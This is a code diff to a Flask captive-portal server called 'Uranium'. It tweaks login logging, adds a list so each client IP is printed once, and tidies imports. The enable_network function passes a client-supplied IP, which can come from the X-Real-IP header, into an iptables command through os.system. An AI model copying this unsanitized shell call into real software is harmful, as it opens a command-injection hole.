@@ -1,11 +1,11 @@
 from flask import Flask, redirect, url_for, request, render_template, request
 from modules.banner import bstring
+from threading import Timer
 import os
 import argparse
 import datetime
 import flask.cli
 import logging
-import numpy as np
 import re
 
 parser = argparse.ArgumentParser(description='Uranium http server options help')
@@ -77,24 +77,28 @@ def enable_network(client_ip):
     os.system("iptables -I FORWARD -s " + client_ip + " -j ACCEPT")
     request.close() #close retirection page so device will check for network
 
+
 @app.route('/redirect_page/')
 def redirect_page():
     return render_template('%s/redirect.html' % (template)) 
+
+blacklist = []
 
 @app.route("/", methods=["POST", "GET"])
 def login():
     user_agent_os = str(request.user_agent.platform)
     user_agent_browser = str(request.user_agent.browser)
-    
 
     client = None
     if request.environ.get('HTTP_X_REAL_IP') is not None:
-        client = request.environ.get('HTTP_X_REAL_IP')
+        client = str(request.environ.get('HTTP_X_REAL_IP'))
     else:
-        client = request.environ.get('REMOTE_ADDR')
+        client = str(request.environ.get('REMOTE_ADDR'))
 
-    print(bstring.INFO, "Login request from" + bstring.VIOLET, client + bstring.RESET, "| OS:"+ bstring.VIOLET, user_agent_os + bstring.RESET, "| Browser:" + bstring.VIOLET, user_agent_browser + bstring.RESET)
-
+    if client not in blacklist:
+        blacklist.append(client)
+        print(bstring.INFO + bstring.VIOLET, client + bstring.RESET, "connected", "| OS:"+ bstring.VIOLET, user_agent_os + bstring.RESET, "| Browser:" + bstring.VIOLET, user_agent_browser + bstring.RESET)
+    
     error = None
     if request.method == "POST":
 
@@ -165,7 +169,7 @@ def favicon():
 #     return send_from_directory('js', filename)
 
 if __name__ == '__main__':
-    print("\n" + bstring.BOLD + "[ Uranium Flask Server v1.0 ]" + bstring.RESET)
+    print(bstring.BOLD + "[ Uranium Flask Server v1.0 ]" + bstring.RESET)
 
     if args.local is True:
         HOST_NAME = "127.0.0.1"
